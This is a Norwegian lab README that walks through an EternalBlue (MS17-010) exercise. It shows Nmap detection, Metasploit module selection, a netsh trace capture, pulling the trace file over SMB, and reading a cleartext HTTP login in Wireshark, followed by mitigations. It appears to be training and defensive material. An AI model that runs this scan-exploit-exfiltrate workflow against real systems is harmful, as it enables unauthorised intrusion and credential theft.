# MS17-010 (EternalBlue) + nettverksspor — lab

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
![Lab Only](https://img.shields.io/badge/Scope-Lab%20Only-blue)

Denne laben demonstrerer en helhetlig sikkerhetstest i et **lukket** miljø:
1) identifikasjon av sårbar **SMBv1 / MS17-010**,  
2) utnyttelse-flyt (funn → modulvalg → kjøring),  
3) innsamling av **nettverksspor** på Windows med `netsh trace`,  
4) eksport/konvertering til PCAP og **analyse i Wireshark** som viser en HTTP-innlogging i klartekst.

> **Etikk:** Dette er kun en kontrollert demo i eget labnett. Ikke test mot systemer du ikke eier eller har eksplisitt tillatelse til. Maskér alltid sensitive verdier (brukernavn, passord, tokens, interne IP-er).

---

## Overblikk

**Angriper (Kali) – IP**
![attacker ip](images/attacker-ip.png)

**Intern webapp – landingsside**
![web home](images/webapp-home.png)

**Intern webapp – innlogget oversikt**
![web messages](images/webapp-messages.png)

**Windows (mål/klient) – oversikt**
![windows admin](images/windows-admin.png)

### Mål med øvelsen
- **Verifisere sårbarhet**: Påvise MS17-010 på målmaskinen.
- **Utnytte kontrollert**: Demonstrere at sårbarheten kan gi kjøring/skall i lab.
- **Fange bevis**: Samle Windows-nettverksspor (ETL), eksportere og konvertere til PCAP/PCAPNG.
- **Analysere risiko**: Vise at en HTTP-pålogging kan leses i klartekst i Wireshark.

### Miljø og verktøy
- **Angriper**: Kali Linux  
- **Mål/klient**: Windows med SMBv1 aktivert (sårbar for MS17-010)  
- **Øvrig**: Windows-VM som besøker webappen
- **Verktøy**: Nmap, Metasploit, `netsh trace`, etl2pcapng, editcap, Wireshark

---

## A) Kartlegging og sårbarhetsindikasjon

**Nmap MS17-010 (NSE) – sårbar vert oppdaget**
```bash
nmap --script smb-vuln* -p 445 192.168.x.x
```
![nmap ms17-010](images/nmap-ms17-010.png)

**Metasploit i gang + modulvalg (EternalBlue)**
```bash
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.x.x
```
![msf banner](images/msfconsole-banner.png)  
![msf search](images/msf-search-eternalblue.png)

---

## B) Innsamling av nettverksspor på Windows

**Start sporing med `netsh trace` (ETL)**
```cmd
netsh trace start capture=yes tracefile=C:\50309\net_trc.etl level=verbose
```
![trace start](images/netsh-trace-start.png)

**Stopp og lagre sporet**
```cmd
netsh trace stop
```
![trace stop](images/netsh-trace-stop.png)

*Hvorfor `netsh trace`?* Det er innebygd i Windows og egner seg når du ikke kan installere Wireshark på målmaskinen. Det produserer en **.etl** som må konverteres før analyse i Wireshark.

---

## C) Hente ut og konvertere spor

**Eksfiltrer ETL-filen fra Windows**  
(her via SMB fra Kali – andre sikre metoder fungerer også)
```bash
smbclient //192.168.x.x/50309 -U Administrator
get net_trc.etl
```
![trace exfil](images/trace-exfil.png)

**Konverter `.etl` → `.pcapng` (Windows)**
```powershell
.\etl2pcapng.exe C:\...\net_trc.etl C:\...\net_trc.pcapng
```
![etl2pcapng](images/etl2pcapng-convert.png)

**(Valgfritt) `.pcapng` → `.pcap` for kompatibilitet**
```bash
editcap -F pcap ~/Desktop/net_trc.pcapng ~/Desktop/net_trc.pcap
```
![editcap](images/editcap-convert.png)

---

## D) Analyse i Wireshark

Filtrer på **HTTP** og finn POST-forespørselen. I denne labben går trafikken ukryptert (ingen TLS), og innloggingsdataene fremstår derfor i klartekst.

![wireshark creds](images/wireshark-credentials.png)

**Leseguide:**
- Øverst: HTTP-pakker (200/302/POST).  
- Midt: *Hypertext Transfer Protocol*-panelet med POST-felter (brukernavn/pass).  
- Høyre: hex-visning (ikke nødvendig å vise i klartekst dersom passord sladdes).

---

## Hvorfor teknikken virker (kort forklaring)

- **MS17-010 / EternalBlue** utnytter en feil i **SMBv1** som muliggjør fjernkodekjøring.  
- **`netsh trace`** fanger nettverks-I/O på verts-siden til en ETL. Med **etl2pcapng** (og ev. **editcap**) kan sporet åpnes i **Wireshark**.  
- **HTTP uten TLS** innebærer at **brukernavn og passord** kan leses i klartekst i nettverkssporet.

---

## Forsvar og avbøtende tiltak

**Host / OS**
- Deaktiver **SMBv1** og patch **MS17-010** (oppdater OS).  
- Begrens administrative delinger/tilganger; prinsippet om minste privilegium.

**Nettverk**
- Segmentér SMB til nødvendige soner; blokker uautorisert 445/tcp på tvers av segmenter.  
- Overvåk signaturer/indikatorer relatert til EternalBlue.

**Applikasjon / Bruker**
- Tving **HTTPS** (TLS) for all pålogging.  
- Innfør passordhygiene og MFA; detekter uvanlige innloggingsmønstre.

---

## Reproduser (høydenivå)

1. Kartlegg SMB på mål, bekreft MS17-010-indikasjon (Nmap NSE).  
2. Kjør en kontrollert utnyttelse i lab (Metasploit-flyt).  
3. Start `netsh trace`, gjenskape en **legitim** brukerhandling (HTTP-login), stopp sporet.  
4. Eksporter ETL, konverter til PCAP/PCAPNG, åpne i Wireshark og dokumentér funn.

> **Tips:** Maskér sensitive verdier i skjermbilder før publisering av repoet.

## Lisens
MIT
